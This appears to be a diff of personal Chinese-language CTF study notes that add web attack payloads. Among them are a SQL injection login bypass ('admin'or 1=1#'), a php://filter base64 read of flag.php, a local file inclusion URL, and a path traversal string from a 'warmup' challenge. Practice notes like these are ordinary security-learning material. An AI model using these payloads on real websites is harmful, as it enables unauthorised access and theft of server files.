@@ -251,3 +251,7 @@ data://text/plain；base64，base64编码的代码#编码后传入绕过字符�
 4.网页一大堆乱码搜索ctf：ctrl+F
 2026.3.5
 登录问题 用户名直接输入admin'or 1=1#
+简单包含/include.php?test=phpinfo.php
+/?file=php://filter/convert.base64-encode/resource=flag.php查看flag
+warmup:目录层数：根目录.www.var.html(包含resource和hint),flag一般在根目录下面，返回四层目录../
+/source.php?file=source.php?/../../../../ffffllllaaaagggg
